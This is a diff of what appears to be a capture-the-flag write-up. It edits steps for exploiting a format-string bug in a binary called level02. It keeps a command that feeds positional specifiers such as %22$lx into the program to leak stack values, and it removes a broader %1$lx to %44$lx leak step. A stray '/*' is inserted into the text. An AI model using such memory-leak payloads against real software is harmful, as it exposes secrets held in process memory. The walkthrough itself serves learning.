@@ -71,25 +71,9 @@ Among them, look for values that look like ASCII when decoded, for example value
 0x41
 0x6e
 0x75
-
+/*
 4. Cleaner leak with indexed positions
 
-Use positional format specifiers:
-
-(python -c 'print " ".join(["%%%d$lx" % i for i in range(1, 45)]); print "A"') | ./level02
-
-This prints:
-%1$lx %2$lx %3$lx ... %44$lx
-
-For this level, the useful values are often around:
-
-%22$lx
-%23$lx
-%24$lx
-%25$lx
-%26$lx
-
-So test directly:
 (python -c 'print "%22$lx %23$lx %24$lx %25$lx %26$lx"; print "A"') | ./level02
 
 5. Why the output looks reversed
